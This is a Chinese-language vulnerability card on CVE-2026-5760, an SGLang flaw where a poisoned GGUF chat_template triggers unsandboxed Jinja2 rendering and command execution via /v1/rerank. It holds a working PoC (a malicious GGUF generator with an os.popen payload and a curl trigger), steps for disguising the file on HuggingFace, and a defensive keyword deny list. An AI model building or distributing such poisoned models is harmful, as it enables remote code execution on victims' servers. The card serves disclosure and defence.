---
id: ai-security-supply-chain-sglang-gguf-rerank-template-ssti-rce
title: SGLang GGUF 投毒 RCE（CVE-2026-5760）：恶意 chat_template 经 rerank 无沙箱 Jinja2 渲染执行命令
type: scenario
domain: ai-security
path: ai-security/supply-chain
technique: sglang-gguf-rerank-chat-template-jinja2-ssti
tags:
- ai-security
- supply-chain
- gguf
- sglang
- jinja2
- ssti
- rce
- model-file
- chat-template
- cve-2026-5760
cve:
- CVE-2026-5760
severity: critical
confidence: high
status: verified
affected_versions: SGLang <= 0.5.9（0.5.10 修复）
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V133
  verified_at: '2026-11-06T05:39:19+08:00'
  notes: 已对照原文与图01-08核对：CVE-2026-5760/CVSS 9.8、影响 <=0.5.9/修复 0.5.10、serving_rerank.py 的 _detect_rerank_backend/_is_qwen3_reranker_template、原生 jinja2.Environment、lipsum.__globals__['os'].popen、GGUF KV type 8、curl 触发与 debug_rendered 回显均一致；版本标记与原文一致。未验证点：未复跑恶意 GGUF/靶机，PoC 未本机执行；frontmatter 无 sources/source_url。
url: /docs/ai-security/supply-chain/ai-security-supply-chain-sglang-gguf-rerank-template-ssti-rce/
draft: false
kb_aliases:
- CVE-2026-5760
- SGLang GGUF 投毒
- serving_rerank.py
- _detect_rerank_backend
- _is_qwen3_reranker_template
- lipsum SSTI
- /v1/rerank RCE
---

## 一句话结论

攻击者构造一个在 GGUF 元数据 `tokenizer.chat_template` 中写入 Jinja2 SSTI 载荷的恶意模型并上传到 HuggingFace，任何用 SGLang `<= 0.5.9` 加载该模型并提供 `/v1/rerank` 服务的受害者，都会在收到第一个正常 Rerank 请求时，因模板被 `jinja2.Environment` 无沙箱渲染而以服务进程权限执行任意系统命令（CVE-2026-5760，CVSS 9.8）。

## 原理

- **GGUF 元数据是攻击面**：GGUF 文件由 24 字节 Header（magic `GGUF`、版本、Tensor 数量、KV 数量）、Metadata KV Pairs（架构、层数、分词器配置等）和 Tensor Data 组成。`tokenizer.chat_template` 是字符串类型的 KV（value type = 8），本应只是数据，但会被推理框架当作 Jinja2 模板编译执行。
- **路由判定可伪造**：SGLang 的 `/v1/rerank` 在 `python/sglang/srt/entrypoints/openai/serving_rerank.py` 中由 `_detect_rerank_backend()` 选择后端。`_is_qwen3_reranker_template()` 只做简单字符串匹配：模板小写后包含 `answer can only be "yes" or "no"`，或同时包含 `answer can only be`、`"yes"`、`"no"`，就返回真。攻击者只要在恶意模板开头加上这句话，请求就会被无条件路由到 `text_decoder` 路径。
- **无沙箱渲染**：进入 `text_decoder` 后，`_render_jinja_chat_template()` 调用 `_get_jinja_env()`；后者返回原生 `jinja2.Environment(loader=BaseLoader(), autoescape=False, undefined=Undefined)`，而不是 `jinja2.sandbox.ImmutableSandboxedEnvironment`。原生环境允许模板访问对象内部属性，等于把模板当任意 Python 代码执行。
- **lipsum 逃逸**：Jinja2 默认把 `lipsum`、`range`、`dict` 等函数注入全局命名空间。`lipsum` 定义在 `jinja2.utils`，该模块顶部 `import os`，因此 `lipsum.__globals__["os"]` 直接拿到 `os` 模块；`{{ lipsum.__globals__["os"].popen("id").read() }}` 即可执行命令。渲染时只传入 `messages` 并不影响利用，因为攻击者不依赖传入变量。
- **沙箱修复**：`ImmutableSandboxedEnvironment` 在访问 `__globals__` 等敏感属性时抛出 `SecurityError: access to attribute '__globals__' of 'function' object is unsafe`，阻断逃逸链。SGLang 0.5.10 将原生 `Environment` 替换为沙箱环境修复。
- **延迟触发**：模型加载时只读取 `chat_template` 到内存，真正 `render()` 发生在第一个 `/v1/rerank` 请求；因此恶意模型可以正常加载、服务正常启动，静态扫描容易漏掉。

## 触发条件

- 目标使用 SGLang `<= 0.5.9`，并加载攻击者可控的 GGUF（或 Safetensors）模型提供 Rerank 服务。
- 模型 `tokenizer.chat_template` 可控，且包含触发路由的字符串 `answer can only be "yes" or "no"`。
- `/v1/rerank` 接口可达，攻击者能发送一次普通 Rerank 请求。
- 服务进程具备命令执行/文件写入/网络出站权限（模板可访问 Python 内建对象）。
- 目标未使用 `ImmutableSandboxedEnvironment`，也未在加载前对 `chat_template` 做语法白名单/人工审核。

## 利用步骤

1. **构造恶意 GGUF**：用 `gguf.GGUFWriter` 创建 `arch="qwen3"` 的模型，调用 `add_chat_template(PAYLOAD)` 写入恶意模板，再添加一个极小的空 Tensor（如 `token_embd.weight` shape `(1,1)`）保证文件结构合法。
2. **模板内容**：开头放 `The answer can only be "yes" or "no".` 通过路由检测；随后放 `{{ lipsum.__globals__["os"].popen("id && uname -a").read() }}` 执行命令；最后放 `{% for message in messages %}{{ message["content"] }}{% endfor %}` 保证正常渲染、不中断流程。
3. **分发**：把生成的 `malicious_reranker.gguf`（体积可小于 1 MB）上传到 HuggingFace 或通过模型仓库/共享链接投递，伪装成正常 Reranker。
4. **受害者加载**：受害者用 SGLang 加载该模型并启动 `/v1/rerank` 服务；模型正常加载、服务正常启动。
5. **触发**：向 `/v1/rerank` 发送完全正常的请求（如 `query` 为常识问题、`documents` 为正常文档）；模板在构造 Prompt 时渲染，命令执行。
6. **回显**：命令输出会混入正常渲染的模板文本，通过响应的 `debug_rendered` 字段或应用日志回显；确认 `id`/`uname -a` 结果。

## PoC

恶意 GGUF 生成（原文最小化）：

```python
import numpy as np
from gguf import GGUFWriter

PAYLOAD = (
    'The answer can only be "yes" or "no".\n'
    '{{ lipsum.__globals__["os"].popen("id && uname -a").read() }}'
    '{% for message in messages %}{{ message["content"] }}{% endfor %}'
)

writer = GGUFWriter("malicious_reranker.gguf", arch="qwen3")
writer.add_name("Qwen3-Reranker-Evil")
writer.add_chat_template(PAYLOAD)
writer.add_tensor("token_embd.weight", np.zeros((1, 1), dtype=np.float32))

writer.write_header_to_file()
writer.write_kv_data_to_file()
writer.write_tensors_to_file()
writer.close()
```

触发请求：

```bash
curl -s -X POST http://localhost:30000/v1/rerank \
  -H "Content-Type: application/json" \
  -d '{
    "model": "reranker",
    "query": "What is the capital of France?",
    "documents": ["Paris is the capital of France."]
  }'
```

修复对照：在 SGLang 0.5.10+ 下加载同一模型并发送同一请求，应返回 `SecurityError`（访问 `__globals__` 被沙箱阻断），命令不执行。

## 变体与关联

- **同技术族不同组件**：llama-cpp-python 的 GGUF `tokenizer.chat_template` Jinja2 SSTI（CVE-2024-34359）使用 `cycler.__init__.__globals__.__builtins__` 链，见 [[ai-security-supply-chain-llama-cpp-gguf-chat-template-jinja2-ssti-rce]]；本卡是 SGLang 的 rerank 路径与 `lipsum` 链。
- **模型格式变体**：Safetensors 的 `tokenizer_config.json`/`config.json` 中的 chat template、Pickle checkpoint、自定义 Python 模型代码都可能成为“模型文件→代码执行”入口。
- **路由绕过变体**：除 `answer can only be "yes" or "no"` 外，其他满足 `_is_qwen3_reranker_template` 的字符串组合也可触发 `text_decoder`；不同 SGLang 版本的判定逻辑可能变化。
- **载荷变体**：`lipsum.__globals__["os"]` 可换成 `subprocess`、`open/write`、反弹 Shell 等；沙箱版本需关注自定义 filter/global 是否重新暴露危险对象。
- **关联卡片**：[[ai-security-supply-chain-invokeai-model-install-picklescan-fail-open-rce]]、[[ai-security-supply-chain-huggingface-pickle-model-reverse-shell]]、[[web-python-ssti-jinja2-flask-globals-rce]]。

## 检测与防御

- **升级**：将 SGLang 升级到 0.5.10+，确认 rerank 路径使用 `ImmutableSandboxedEnvironment` 而非原生 `jinja2.Environment`。
- **模型准入**：把 `tokenizer.chat_template` 当作代码审计，使用 `gguf-dump model.gguf | grep -i "chat_template" -A 5` 提取模板，拒绝含 `__globals__`、`__subclasses__`、`__builtins__`、`popen`、`system` 等敏感关键字的模板；不需要模型自带模板时强制使用平台内置模板。
- **加载隔离**：外部模型在一次性沙箱/容器中加载，非 root、只读根文件系统、无云凭据/SSH Key、默认阻断出站，限制 CPU/内存/进程/时间。
- **运行时监控**：告警 `/v1/rerank` 响应 `debug_rendered` 或日志中出现模板语法/命令输出、模型服务异常子进程、非预期外联；记录模型来源、SHA256、metadata 与加载时间。
- **供应链治理**：对 HuggingFace 等来源的模型做签名/哈希与 metadata 字段级校验；不要只校验 Tensor 区域，模板与配置同样不可信；对模型仓库的上传者与文件变更做审计。
